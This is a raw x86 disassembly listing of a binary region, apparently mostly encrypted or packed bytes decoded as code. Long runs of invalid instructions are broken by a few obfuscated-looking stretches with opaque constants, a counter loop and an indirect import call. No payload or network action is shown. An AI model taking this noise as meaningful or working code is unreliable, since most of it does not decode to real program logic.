  415e92:	sub    esp,DWORD PTR [ecx+ebp*1-0x2e0f1319]
  415e99:	jo     0x415ec4
  415e9b:	sub    BYTE PTR [edx-0x42],cl
  415e9e:	xchg   ebx,eax
  415e9f:	mov    DWORD PTR [ebp-0x67],edx
  415ea2:	lock add ebx,DWORD PTR [edi]
  415ea5:	cdq    
  415ea6:	ds mov dh,0x1d
  415ea9:	or     BYTE PTR [edi],dl
  415eab:	xchg   ebx,eax
  415eac:	cmovs  edi,DWORD PTR [eax+eax*4-0x39]
  415eb1:	fldenv [edi]
  415eb3:	out    dx,al
  415eb4:	(bad)  
  415eb5:	repnz repnz xor eax,0xbf7f67c0
  415ebc:	xchg   ebp,eax
  415ebd:	dec    ebx
  415ebe:	mov    ds:0xd45697d9,eax
  415ec3:	fwait
  415ec4:	das    
  415ec5:	in     al,0x1
  415ec7:	out    0xd9,eax
  415ec9:	sub    al,ch
  415ecb:	cwde   
  415ecc:	xchg   edx,eax
  415ecd:	and    eax,0x6ec3ec7e
  415ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed3:	push   edi
  415ed4:	jo     0x415e5b
  415ed6:	mov    ah,0x67
  415ed8:	sti    
  415ed9:	cwde   
  415eda:	out    dx,al
  415edb:	sub    al,0xef
  415edd:	lods   al,BYTE PTR ds:[esi]
  415ede:	jmp    0x415f3d
  415ee0:	dec    edi
  415ee1:	adc    eax,0xa9ae0da4
  415ee6:	mov    DWORD PTR [ebp-0x8],eax
  415ee9:	mov    DWORD PTR ds:0x42a9dd,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42aa61,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42aa65,0x42aa21
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	and    eax,0x271f97cd
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415fb4
  415f57:	stos   DWORD PTR es:[edi],eax
  415f58:	jb     0x415fd5
  415f5a:	shl    DWORD PTR [edx+0x7d],1
  415f5d:	dec    BYTE PTR [ecx+0x2c]
  415f60:	jp     0x415f87
  415f62:	cwde   
  415f63:	jns    0x415f4e
  415f65:	out    dx,al
  415f66:	jmp    0xdd9e:0x5cf4b817
  415f6d:	mov    BYTE PTR [ecx+ecx*2],ah
  415f70:	mov    dl,BYTE PTR [eax+0x1f]
  415f73:	mov    dh,0xd0
  415f75:	mov    edi,0x76bbfe2a
  415f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7b:	retf   
  415f7c:	repnz mov al,0xf5
  415f7f:	fsubr  DWORD PTR [eax+0x7f]
  415f82:	retf   
  415f83:	jl     0x415f29
  415f85:	jmp    0x415f4b
  415f87:	jecxz  0x415fdf
  415f89:	jno    0x415f56
  415f8b:	sub    BYTE PTR [ebp+0x3e],al
  415f8e:	mov    ds:0x72a1e17d,eax
  415f93:	loop   0x415f1d
  415f95:	push   esp
  415f96:	aas    
  415f97:	push   ebx
  415f98:	xchg   dh,ch
  415f9a:	lds    edi,FWORD PTR [ecx+eiz*2-0x78dc8793]
  415fa1:	xchg   ebx,eax
  415fa2:	add    ah,cl
  415fa4:	out    dx,al
  415fa5:	rcr    BYTE PTR [esi+edi*1-0x36],0x7d
  415faa:	sub    dl,BYTE PTR [eax+0x2de138d7]
  415fb0:	xor    eax,eax
  415fb2:	retf   0xbf03
  415fb5:	fdiv   QWORD PTR [edx+0x30b16aae]
  415fbb:	xchg   ebx,eax
  415fbc:	fsub   QWORD PTR [edx+0x5d26ad47]
  415fc2:	sbb    eax,0xe7c68d31
  415fc7:	xor    al,0xc0
  415fc9:	cmovle ecx,esi
  415fcc:	ds (bad) 
  415fce:	xor    ah,BYTE PTR [edx-0x1d]
  415fd1:	adc    ecx,ebp
  415fd3:	fsubr  DWORD PTR [ebp-0x73b6b525]
  415fd9:	jbe    0x41601e
  415fdb:	sbb    al,0xea
  415fdd:	inc    ebx
  415fde:	fld    TBYTE PTR ds:0x4608d66f
  415fe4:	cmp    eax,0x960f9206
  415fe9:	mov    ecx,0xe7466d18
  415fee:	or     edi,DWORD PTR [ecx]
  415ff0:	mov    dh,0x5
  415ff2:	or     edx,ebx
  415ff4:	popf   
  415ff5:	es pop es
  415ff7:	and    eax,DWORD PTR [eax+0x58e36374]
  415ffd:	test   BYTE PTR [edx-0x23f7e4f4],0x5a
  416004:	nop
  416005:	test   BYTE PTR [ebp-0x47030eb4],bl
  41600b:	mov    ecx,cs
  41600d:	adc    DWORD PTR [ecx-0x1b585f7a],0x6b
  416014:	add    edi,DWORD PTR [edi-0x114d2a7f]
  41601a:	mov    dl,0xe3
  41601c:	fdiv   DWORD PTR [ecx-0x70]
  41601f:	xchg   edx,eax
  416020:	add    DWORD PTR [esi+eiz*2],ebp
  416023:	pop    ebx
  416024:	or     al,0xec
  416026:	fnstcw WORD PTR [esi]
  416028:	or     bh,BYTE PTR [ecx+0x3c]
  41602b:	arpl   bp,cx
  41602d:	fsqrt  
  41602f:	sbb    dl,cl
  416031:	jnp    0x41608f
  416033:	mov    bh,0x3f
  416035:	scas   eax,DWORD PTR es:[edi]
  416036:	or     bh,dl
  416038:	sub    BYTE PTR [ebx],al
  41603a:	jmp    0xcd602428
  41603f:	scas   eax,DWORD PTR es:[edi]
  416040:	shl    BYTE PTR gs:[ebp-0xed9b47d],cl
  416047:	jl     0x416068
  416049:	xchg   esp,eax
  41604a:	div    eax
  41604c:	rol    DWORD PTR [esi],cl
  41604e:	sti    
  41604f:	cmp    edx,ebp
  416051:	imul   ecx,esi,0xdabfa36f
  416057:	std    
  416058:	add    DWORD PTR [ebx+0x7f],ebp
  41605b:	adc    edi,DWORD PTR [edx+0x5d673f64]
  416061:	call   0x98900d63
  416066:	cld    
  416067:	mov    cl,0x1
  416069:	add    eax,0x4750131f
  41606e:	inc    ebp
  41606f:	sub    eax,0x923835c5
  416074:	mov    ecx,0x83085e95
  416079:	mov    cl,0x65
  41607b:	sub    esp,DWORD PTR [ebp-0x1023345b]
  416081:	fld    st(6)
  416083:	pusha  
  416084:	mov    BYTE PTR [ebx],ch
  416086:	std    
  416087:	std    
  416088:	or     edx,edi
  41608a:	inc    ebp
  41608b:	xchg   edi,eax
  41608c:	pop    DWORD PTR [edi+0x64a409af]
  416092:	push   esp
  416093:	data16 fistp WORD PTR [esi]
  416096:	je     0x416062
  416098:	test   dl,0xbe
  41609b:	ins    DWORD PTR es:[edi],dx
  41609c:	fld    TBYTE PTR [eax+0x2684b6bd]
  4160a2:	add    BYTE PTR [ecx-0x42],0x36
  4160a6:	and    esi,esi
  4160a8:	xor    BYTE PTR [edx+0xb],0x5
  4160ac:	(bad)  
  4160ad:	mov    dh,0x1f
  4160af:	rol    DWORD PTR [edx+0x1c0f34d1],0x29
  4160b6:	mov    ds:0x362d4c5,eax
  4160bb:	out    0xcd,al
  4160bd:	xchg   esi,eax
  4160be:	loopne 0x41610b
  4160c0:	jmp    0x64bc617
  4160c5:	xchg   edi,eax
  4160c6:	cld    
  4160c7:	jp     0x416126
  4160c9:	or     ecx,DWORD PTR [eax]
  4160cb:	cmp    DWORD PTR [esi],edi
  4160cd:	and    ebp,ebp
  4160cf:	outs   dx,BYTE PTR ds:[esi]
  4160d0:	xchg   edi,eax
  4160d1:	arpl   WORD PTR [edi-0x6b],si
  4160d4:	(bad)  
  4160d5:	(bad)  
  4160d6:	dec    esp
  4160d7:	xchg   ecx,eax
  4160d8:	sub    DWORD PTR [ebx],eax
  4160da:	and    bh,ch
  4160dc:	jo     0x4160fc
  4160de:	iret   
  4160df:	out    dx,eax
  4160e0:	mov    edi,0xbabf992f
  4160e5:	inc    ecx
  4160e6:	mov    bl,0x16
  4160e9:	mov    al,ds:0xc2382d0e
  4160ee:	cs (bad) 
  4160f0:	fild   DWORD PTR [esp+ebx*2+0x60]
  4160f4:	aaa    
  4160f5:	inc    eax
  4160f6:	dec    DWORD PTR [eax+ebp*2+0x2d4a10f6]
  4160fd:	shl    BYTE PTR [eax],cl
  4160ff:	dec    ecx
  416100:	mov    edi,0x396a45f
  416105:	mov    ebx,0x1db5ce35
  41610a:	call   0x1f27:0xd015cd83
  416111:	mov    ch,0xea
  416113:	cmp    eax,0xff7dea27
  416118:	add    al,0xa4
  41611a:	daa    
  41611b:	sbb    eax,0x4da1e8c0
  416120:	add    al,0xe8
  416122:	mov    ah,0x92
  416124:	mov    ah,BYTE PTR [ebp-0x45ee4293]
  41612a:	jle    0x416102
  41612c:	mov    esi,DWORD PTR [edi]
  41612e:	mov    al,0x99
  416130:	pop    edi
  416131:	inc    ebx
  416132:	fld    QWORD PTR [edx+0x15]
  416135:	mov    al,ds:0xeb0212dc
  41613a:	sub    DWORD PTR [ebp-0x657b975a],esp
  416140:	xor    dh,BYTE PTR [ebx+0x42]
  416143:	aas    
  416144:	std    
  416145:	jae    0x416181
  416147:	or     ch,BYTE PTR [ecx-0x7d449af0]
  41614d:	pop    esi
  41614e:	int    0x71
  416150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416151:	jno    0x416160
  416153:	and    eax,0x5fb94b47
  416158:	(bad)  
  416159:	sbb    eax,DWORD PTR [eax-0x696dc24c]
  41615f:	(bad)  
  416160:	and    eax,0xa0ceb9f9
  416165:	dec    ebx
  416166:	mov    WORD PTR [ebp-0x7b],fs
  416169:	hlt    
  41616a:	add    bl,BYTE PTR [edx-0x9bfee1]
  416170:	pop    ebp
  416171:	rol    BYTE PTR [eax],0x4
  416174:	xchg   ebx,eax
  416175:	vcmpps ymm2,ymm2,YMMWORD PTR [edx-0x4288ca05],0x5a
  41617e:	mov    eax,0x812b0ded
  416183:	test   al,0x5
  416185:	jmp    0x4161ca
  416187:	scas   eax,DWORD PTR es:[edi]
  416188:	test   ebx,ecx
  41618a:	ins    DWORD PTR es:[edi],dx
  41618b:	inc    esp
  41618c:	dec    edx
  41618d:	lahf   
  41618e:	mov    bh,0xd8
  416190:	fldlg2 
  416192:	mov    DWORD PTR [edx+esi*1+0x7db81b5b],edx
  416199:	adc    cl,bl
  41619b:	call   0x91ac:0x3ddb17cb
  4161a2:	mov    bh,0x2a
  4161a4:	mov    esi,DWORD PTR [ebp+0x10]
  4161a7:	pop    edx
  4161a8:	es pop ds
  4161aa:	scas   al,BYTE PTR es:[edi]
  4161ab:	outs   dx,DWORD PTR ds:[esi]
  4161ac:	jmp    0x41619c
  4161ae:	imul   BYTE PTR ds:0x12dd0962
  4161b4:	and    ebx,DWORD PTR [ebp+0x2bd04475]
  4161ba:	mov    ecx,0x61042308
  4161bf:	pop    ecx
  4161c0:	push   0x5
  4161c2:	mov    eax,0x9602b5f7
  4161c7:	(bad)  
  4161c8:	mov    al,ds:0x6829683f
  4161cd:	and    DWORD PTR [ebx],ecx
  4161cf:	jecxz  0x416203
  4161d1:	xchg   edi,eax
  4161d2:	loope  0x41618d
  4161d4:	(bad)  
  4161d5:	sbb    DWORD PTR [ecx-0x5f],eax
  4161d8:	sub    BYTE PTR [edx+0x40e3c362],bh
  4161de:	shl    ecx,1
  4161e0:	int    0x1b
  4161e2:	arpl   WORD PTR [ecx+edx*4],dx
  4161e5:	call   0x8012eb77
  4161ea:	std    
  4161eb:	add    ch,bl
  4161ed:	pop    ss
  4161ee:	stc    
  4161ef:	or     WORD PTR [ebx+0x5c7fc45],0xaaed
  4161f8:	inc    edx
  4161f9:	add    BYTE PTR [eax+eax*1],bl
  4161fc:	add    BYTE PTR [eax],al
  4161fe:	cmp    DWORD PTR ds:0x42aaed,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42aaed,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42aaed,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42aaed
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42aaed,edx
  416249:	mov    edx,DWORD PTR ds:0x42aaed
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42aaed,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a9c9,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42aaa1,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x586c7d46]
  416290:	pop    ss
  416291:	mov    esp,0x95787f18
  416296:	jle    0x416310
  416298:	js     0x4162ef
  41629a:	push   0x9c68faaa
  41629f:	or     bh,BYTE PTR [eax+0x3844cd7d]
  4162a5:	sbb    al,0xc6
  4162a7:	add    DWORD PTR [ebp-0x48cec506],esi
  4162ad:	adc    DWORD PTR [edi],edi
  4162af:	mov    eax,ds:0x8bfb1319
  4162b4:	out    0xc4,al
  4162b6:	mov    cl,0xe1
  4162b8:	or     ecx,DWORD PTR [edi]
  4162ba:	loopne 0x41631c
  4162bc:	xor    eax,0xcf003c6d
  4162c1:	(bad)  
  4162c2:	pop    ebx
  4162c3:	xchg   ebx,eax
  4162c4:	stos   BYTE PTR es:[edi],al
  4162c5:	imul   ebx
  4162c7:	sub    ah,BYTE PTR [esi]
  4162c9:	addr16 aam 0x97
  4162cc:	mov    ecx,0x3e82b64f
  4162d1:	xor    esi,DWORD PTR [edx]
  4162d3:	(bad)  
  4162d4:	call   0xd0426734
  4162d9:	push   esi
  4162da:	mov    ebp,0xb46d0a14
  4162df:	jns    0x41629e
  4162e1:	mov    al,0x9d
  4162e3:	xor    eax,0x849dd302
  4162e8:	or     DWORD PTR [eax-0x7c],edi
  4162eb:	and    BYTE PTR [edx+0x1c],ah
  4162ee:	jns    0x416283
  4162f0:	loope  0x416293
  4162f2:	(bad)  
  4162f3:	pop    ecx
  4162f4:	std    
  4162f5:	in     eax,dx
  4162f6:	pop    edx
  4162f7:	int    0xd3
  4162f9:	dec    ebp
  4162fa:	cmp    edx,DWORD PTR [edx]
  4162fc:	(bad)  
  4162fd:	nop
  4162fe:	imul   esp,DWORD PTR [esi],0xca51dcfa
  416304:	jbe    0x416297
  416306:	imul   eax,DWORD PTR [ebx+0x73a05862],0x9e4b97e6
  416310:	inc    edx
  416311:	je     0x416382
  416313:	sbb    al,0x52
  416315:	stos   DWORD PTR es:[edi],eax
  416316:	sub    ah,cl
  416318:	xor    BYTE PTR [esi+ecx*8],ch
  41631b:	ins    DWORD PTR es:[edi],dx
  41631c:	adc    BYTE PTR [edx+0x4697b58d],ah
  416322:	in     eax,dx
  416323:	dec    esi
  416324:	clc    
  416325:	push   0x8118bd31
  41632a:	fdiv   DWORD PTR [eax-0x19]
  41632d:	dec    ebx
  41632e:	lahf   
  41632f:	shl    DWORD PTR [ebp-0xedc48f4],cl
  416335:	(bad)  
  416337:	xor    DWORD PTR [edi],edi
  416339:	call   0x5e61:0x7da86229
  416340:	lods   eax,DWORD PTR cs:[esi]
  416342:	inc    esp
  416343:	inc    ecx
  416344:	and    dl,bl
  416346:	mov    ch,0x35
  416348:	dec    ebx
  416349:	imul   eax,ecx,0x265633ca
  41634f:	mov    eax,ds:0x8250ab3e
  416354:	repnz adc al,0xf8
  416357:	sbb    al,0x25
  416359:	and    ch,bh
  41635b:	mov    DWORD PTR [edx+0x27],edx
  41635e:	ss into 
  416360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416361:	hlt    
  416362:	rcr    BYTE PTR [eax],1
  416364:	fimul  DWORD PTR [ecx-0x29]
  416367:	push   ds
  416368:	and    esi,DWORD PTR [edi]
  41636a:	(bad)  
  41636b:	mov    ecx,0xc7234ad2
  416370:	jb     0x41633f
  416372:	inc    esi
  416373:	in     eax,0x26
  416375:	xor    cl,dh
  416377:	jnp    0x41639d
  416379:	outs   dx,BYTE PTR ds:[esi]
  41637a:	jmp    0xe4aa:0x4eb31707
  416381:	and    eax,0x17fe0d05
  416386:	mov    ch,0xfa
  416388:	rcr    edi,cl
  41638a:	mov    dl,0x16
  41638c:	push   ebx
  41638d:	mov    edi,0xcf065068
  416392:	clc    
  416393:	test   eax,0x47ed7985
  416398:	aaa    
  416399:	mov    cl,0xc7
  41639b:	call   0xfeba:0xf9540752
  4163a2:	push   0xc8306347
  4163a7:	je     0x416345
  4163a9:	add    edx,DWORD PTR [ecx-0x67f970d8]
  4163af:	loopne 0x4163af
  4163b1:	xchg   esi,eax
  4163b2:	or     eax,0xf66141af
  4163b7:	cmp    dh,BYTE PTR [ebp-0x592c498]
  4163bd:	mov    al,0xc3
  4163bf:	dec    eax
  4163c0:	aas    
  4163c1:	pushf  
  4163c2:	ins    BYTE PTR es:[edi],dx
  4163c3:	imul   esi,DWORD PTR [eax+0x24],0xe98c189a
  4163ca:	(bad)  
  4163cb:	test   DWORD PTR [esi-0x13b11de6],0xd250b5a1
  4163d5:	xor    edx,eax
  4163d7:	xor    cl,BYTE PTR [edx-0x451a84f2]
  4163dd:	add    DWORD PTR [ebx-0x6c],edx
  4163e0:	xor    BYTE PTR cs:[ebx],bl
  4163e3:	mov    ecx,0x6e21d781
  4163e8:	inc    eax
  4163e9:	int3   
  4163ea:	mov    edx,0xcb77df0
  4163ef:	xor    DWORD PTR [edi+0x79],eax
  4163f2:	sti    
  4163f3:	push   edx
  4163f4:	das    
  4163f5:	inc    ebp
  4163f6:	sbb    ch,0x22
  4163f9:	add    DWORD PTR [eax+0x7a796264],ebp
  4163ff:	nop    DWORD PTR [ecx+0x72f394c9]
  416406:	repz (bad) 
  416408:	fdiv   st,st(2)
  41640a:	sub    eax,0xbd9ba3a9
  41640f:	sub    bl,BYTE PTR [edx-0x2a]
  416412:	sub    al,BYTE PTR [ebx-0x61e31ccc]
  416418:	cmp    BYTE PTR [eax+eiz*2+0x1f],dl
  41641c:	pop    ds
  41641d:	ret    0x45b3
  416420:	in     eax,0x9e
  416422:	int3   
  416423:	pop    esp
  416424:	dec    ebx
  416425:	xlat   BYTE PTR ds:[ebx]
  416426:	and    al,0xa2
  416428:	jge    0x4163d1
  41642a:	mov    edx,0xb9e34f5b
  41642f:	shl    ecx,1
  416431:	mov    bl,0x78
  416433:	jnp    0x41640d
  416435:	fisub  DWORD PTR [di]
  416438:	adc    DWORD PTR [eax-0x5e780e3],edx
  41643e:	adc    ebp,DWORD PTR [ebp+0x3b]
  416441:	aaa    
  416442:	sar    BYTE PTR [ebp-0x48e6cf85],cl
  416448:	leave  
  416449:	sbb    esi,esi
  41644b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41644c:	xor    ebp,DWORD PTR [edx]
  41644e:	jns    0x4163e9
  416450:	imul   esp,DWORD PTR [ecx],0x51
  416453:	add    dl,BYTE PTR [ecx]
  416455:	jnp    0x416432
  416457:	adc    eax,0xa06b8676
  41645c:	sbb    ch,BYTE PTR [ebx+edi*1-0x9e13003]
  416463:	cmp    ecx,eax
  416465:	scas   eax,DWORD PTR es:[edi]
  416466:	inc    edi
  416467:	or     esp,ebp
  416469:	lods   al,BYTE PTR ds:[esi]
  41646a:	shl    DWORD PTR ds:0xce491ed5,cl
  416470:	std    
  416471:	out    dx,eax
  416472:	cmp    al,BYTE PTR [ecx+eax*4-0x80]
  416476:	inc    esp
  416477:	sub    ecx,DWORD PTR [eax+ecx*1-0x3f3d55d7]
  41647e:	mov    BYTE PTR [edi-0x3d],ah
  416481:	repz inc esp
  416483:	shr    ah,1
  416485:	and    ah,bl
  416487:	inc    ebx
  416488:	jo     0x416454
  41648a:	cmp    DWORD PTR [ecx],ebx
  41648c:	(bad)  
  41648d:	cli    
  41648e:	std    
  41648f:	mov    ah,0xde
  416491:	nop
  416492:	jmp    0x4164a9
  416494:	punpckhdq mm4,QWORD PTR [bp+di]
  416498:	in     eax,0x51
  41649a:	and    al,0x86
  41649c:	ins    BYTE PTR es:[edi],dx
  41649d:	in     al,dx
  41649e:	nop
  41649f:	mov    edx,0x1d4f8ba9
  4164a4:	push   cs
  4164a5:	inc    ebx
  4164a6:	mov    al,ds:0xa60998cf
  4164ab:	rcr    dl,1
  4164ad:	jecxz  0x4164b1
  4164af:	sub    DWORD PTR [edx+0x32d1d71d],0x4c137edc
  4164b9:	in     eax,dx
  4164ba:	lods   eax,DWORD PTR ds:[esi]
  4164bb:	aas    
  4164bc:	inc    ebp
  4164bd:	test   al,0xcb
  4164bf:	dec    eax
  4164c0:	leave  
  4164c1:	bound  edi,QWORD PTR [ecx+0x67]
  4164c4:	mov    ch,0xcb
  4164c6:	cmc    
  4164c7:	xor    esp,esp
  4164c9:	lods   eax,DWORD PTR ds:[esi]
  4164ca:	retf   0xc598
  4164cd:	mov    ah,0x1
  4164cf:	xchg   DWORD PTR [esi-0x61],ebp
  4164d2:	push   esp
  4164d3:	cs mov dh,0xbb
  4164d6:	pop    edi
  4164d7:	ret    
  4164d8:	mov    esi,0x25f332df
  4164dd:	(bad)  
  4164de:	(bad)  
  4164df:	jmp    0x416462
  4164e1:	push   edi
  4164e2:	scas   eax,DWORD PTR es:[edi]
  4164e3:	sbb    al,0xde
  4164e5:	addr16 push eax
  4164e7:	popf   
  4164e8:	jle    0x416553
  4164ea:	jmp    FWORD PTR [ecx+0x48da9aa3]
  4164f0:	or     al,0xe3
  4164f2:	xchg   ebx,eax
  4164f3:	(bad)  
  4164f4:	loopne 0x416546
  4164f6:	int    0xad
  4164f8:	imul   ecx,DWORD PTR [esi+0x1a],0x43652518
  4164ff:	call   0x3f71:0xe11799b4
  416506:	push   bx
  416508:	xchg   DWORD PTR [ecx+ebx*2+0x5e],edi
  41650c:	imul   ecx,edx,0xffffffa0
  41650f:	or     ebx,DWORD PTR [ebp-0x3d]
  416512:	in     al,dx
  416513:	addr16 xchg ecx,eax
  416515:	arpl   WORD PTR [ecx],di
  416517:	cmp    cl,BYTE PTR [edx-0x74]
  41651a:	rol    al,cl
  41651c:	jl     0x264d61e9
  416522:	gs inc edx
  416524:	aaa    
  416525:	cmp    esp,DWORD PTR [edi]
  416527:	cmp    BYTE PTR [ebp+0x5ae38287],bh
  41652d:	xchg   ebp,eax
  41652e:	sbb    esp,DWORD PTR [ebp+0x1dd6cbf8]
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0xd1c839a],cl
  416557:	jecxz  0x41658c
  416559:	in     eax,0xd9
  41655b:	sbb    eax,0x7e95787f
  416560:	js     0x4165da
  416562:	shl    BYTE PTR [esi+0x57a455c5],0x1
  416569:	inc    ebx
  41656a:	sbb    DWORD PTR es:[ecx+0x547e1a73],esp
  416571:	xor    DWORD PTR [edx],0xc9902206
  416577:	into   
  416578:	ins    DWORD PTR es:[edi],dx
  416579:	adc    eax,0x9b6046e0
  41657e:	jg     0x416582
  416580:	and    eax,eax
  416582:	xchg   edx,eax
  416583:	pop    esi
  416584:	add    DWORD PTR [edi],ecx
  416586:	int    0x0
  416588:	mov    edx,0xba43596a
  41658d:	mov    bh,0xee
  41658f:	mov    WORD PTR [edi],ss
  416591:	lea    esp,[eax]
  416593:	ficomp WORD PTR [ecx+0x53]
  416596:	retf   
  416597:	add    edi,DWORD PTR [ebp+0x2c754ab9]
  41659d:	pop    ebp
  41659e:	add    al,0x8d
  4165a0:	fcom   st(6)
  4165a2:	sbb    eax,0x3eb10229
  4165a7:	cmp    BYTE PTR [esi+ebp*1+0x2c783c23],dl
  4165ae:	mov    esp,0xd491145c
  4165b3:	shl    DWORD PTR [edi+ecx*4],0x35
  4165b7:	cmp    DWORD PTR [ecx+0x27],ebx
  4165ba:	push   eax
  4165bb:	cmp    DWORD PTR [di],0x7c7ebd9b
  4165c2:	dec    esi
  4165c3:	push   esp
  4165c4:	sbb    BYTE PTR ds:0x85c5c96c,dl
  4165ca:	ins    DWORD PTR es:[edi],dx
  4165cb:	stos   DWORD PTR es:[edi],eax
  4165cc:	mov    dl,0xa7
  4165ce:	ror    edx,1
  4165d0:	and    BYTE PTR [edx+0x4472ce44],ch
  4165d6:	push   ecx
  4165d7:	xlat   BYTE PTR ds:[ebx]
  4165d8:	in     al,dx
  4165d9:	(bad)  
  4165da:	hlt    
  4165db:	pop    ebx
  4165dc:	sbb    bl,bl
  4165de:	mov    eax,DWORD PTR [eax+eax*2+0x7e4dd47]
  4165e5:	adc    bl,BYTE PTR [edx+0x22]
  4165e8:	fiadd  DWORD PTR [eax+0x38b44083]
  4165ee:	lods   al,BYTE PTR ds:[esi]
  4165ef:	in     eax,0xdb
  4165f1:	in     eax,0x15
  4165f3:	jne    0x41658e
  4165f5:	and    eax,DWORD PTR [ebp-0x68]
  4165f8:	inc    edi
  4165f9:	out    0x42,ax
  4165fc:	mov    gs,WORD PTR [ebx+0x66]
  4165ff:	lods   al,BYTE PTR ds:[esi]
  416600:	xchg   ebp,eax
  416601:	cmp    esi,ebx
  416603:	lds    ecx,FWORD PTR [esi-0x649cda18]
  416609:	jle    0x416646
  41660b:	pop    esi
  41660c:	pop    ss
  41660d:	loopne 0x4165b9
  41660f:	in     eax,dx
  416610:	cmp    esp,ebp
  416612:	sar    dh,1
  416614:	scas   al,BYTE PTR es:[edi]
  416615:	dec    ebp
  416616:	aam    0xc1
  416618:	popf   
  416619:	stc    
  41661a:	jnp    0x41661d
  41661c:	loope  0x416624
  41661e:	test   DWORD PTR [esi],ecx
  416620:	leave  
  416621:	mov    edi,0xd552f4b3
  416626:	inc    eax
  416627:	push   eax
  416628:	jno    0x41668b
  41662a:	jae    0x4165d7
  41662c:	pop    ecx
  41662d:	or     DWORD PTR [esi],ebx
  41662f:	(bad)  
  416630:	push   eax
  416631:	bound  eax,QWORD PTR [edi-0x474a53e8]
  416637:	push   0x22
  416639:	fwait
  41663a:	or     DWORD PTR [ebx-0x5f],eax
  41663d:	xchg   BYTE PTR [esi-0x1aa9d77c],bh
  416643:	adc    eax,0x21c8d3dc
  416648:	push   ss
  416649:	adc    DWORD PTR [edx],esi
  41664b:	test   al,0xc3
  41664d:	or     ch,bh
  41664f:	shl    BYTE PTR [ecx-0x5d3b6ff6],cl
  416655:	pop    edi
  416656:	out    dx,eax
  416657:	in     eax,0x67
  416659:	das    
  41665a:	es xchg ecx,eax
  41665c:	pop    esp
  41665d:	ins    DWORD PTR es:[edi],dx
  41665e:	push   esp
  41665f:	pop    esi
  416660:	mov    edx,0xa3c157dc
  416665:	sub    edx,DWORD PTR [edi-0x4d]
  416668:	stos   DWORD PTR es:[edi],eax
  416669:	std    
  41666a:	mov    ebp,0xa5411465
  41666f:	pusha  
  416670:	sbb    al,0xa1
  416672:	mov    ebx,0xd9d0fdad
  416677:	rdmsr  
  416679:	mov    ebx,0x88056ea7
  41667e:	inc    esp
  41667f:	pop    ebx
  416680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416681:	hlt    
  416682:	shl    BYTE PTR [edx+0xa],0xa9
  416686:	cmp    DWORD PTR [ecx-0x535f59bc],0xe2d15e89
  416690:	xchg   esi,eax
  416691:	pusha  
  416692:	jns    0x4166e3
  416694:	jmp    0xfdf2f6b9
  416699:	push   ecx
  41669a:	into   
  41669b:	fcomp  st(5)
  41669d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41669e:	and    esp,DWORD PTR [ebp+0x16]
  4166a1:	or     ecx,DWORD PTR [esi-0x17]
  4166a4:	(bad)
  4166a8:	mov    ecx,0x2ba92b04
  4166ad:	dec    esi
  4166ae:	lock xchg edx,eax
  4166b0:	ins    BYTE PTR es:[edi],dx
  4166b1:	into   
  4166b2:	mov    ecx,DWORD PTR [ebx]
  4166b4:	fcomp  DWORD PTR [eax]
  4166b6:	inc    ebp
  4166b7:	aad    0xef
  4166b9:	lea    edx,[ebx]
  4166bb:	inc    edi
  4166bc:	add    ah,bh
  4166be:	outs   dx,BYTE PTR ds:[esi]
  4166bf:	nop
  4166c0:	cli    
  4166c1:	mov    ecx,0x4677101e
  4166c6:	fcmovnb st,st(0)
  4166c8:	jne    0x416709
  4166ca:	and    eax,0x9bdf1b3e
  4166cf:	sbb    al,0x32
  4166d1:	pop    ebp
  4166d2:	clc    
  4166d3:	neg    BYTE PTR [ebx]
  4166d5:	loopne 0x416752
  4166d7:	jmp    0x41668a
  4166d9:	or     BYTE PTR [esi],dl
  4166db:	aad    0xb8
